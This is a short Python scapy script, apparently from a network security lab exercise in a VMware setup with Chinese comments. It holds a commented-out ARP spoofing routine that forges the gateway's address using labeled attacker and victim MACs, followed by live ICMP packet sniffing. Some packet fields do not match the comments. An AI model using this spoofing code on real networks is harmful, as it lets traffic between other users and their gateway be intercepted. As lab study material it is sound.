import sys
import time
# ----------ARP欺骗
'''
from scapy.all import (
    ARP,
    Ether,
    sendp
)


Ether().show()
ARP().show()
# op。取值为1或者2，代表ARP请求或者响应包。
# hwsrc。发送方Mac地址。
# psrc。发送方IP地址。
# hwdst。目标Mac地址。
# pdst。目标IP地址。
# 102(攻击机)，18(受害机)，(1网关))
# 网关:47.1 00:50:56:c0:00:01
# pc1(受害机):47.132 00:0c:29:b9:bf:5b
# pc2(攻击机):47.133 00:0c:29:c2:59:48
pkt = Ether(src='00:0c:29:c2:59:48', dst='00:0c:29:b9:bf:5b') / ARP(hwsrc='00:0c:29:c2:59:48', psrc='192.168.47.1',hwdst='00:0c:29:c2:59:48', pdst='192.168.47.133', op=1)
pkt = Ether(src='00:0c:29:c2:59:48', dst='ff:ff:ff:ff:ff:ff') / ARP(hwsrc='00:0c:29:c2:59:01', psrc='192.168.47.1', op=1)
# 定义网卡
attck_iface = 'VMware Virtual Ethernet Adapter for VMnet1'
sendp(pkt,inter=2,iface=attck_iface)
'''
# ----------网络嗅探
from scapy.all import sniff
attck_iface = 'VMware Virtual Ethernet Adapter for VMnet1'
pkts = sniff(iface=attck_iface,filter='icmp',count = 3, prn = lambda x: x.summary())
print(pkts[0].show())
print(pkts[1].show())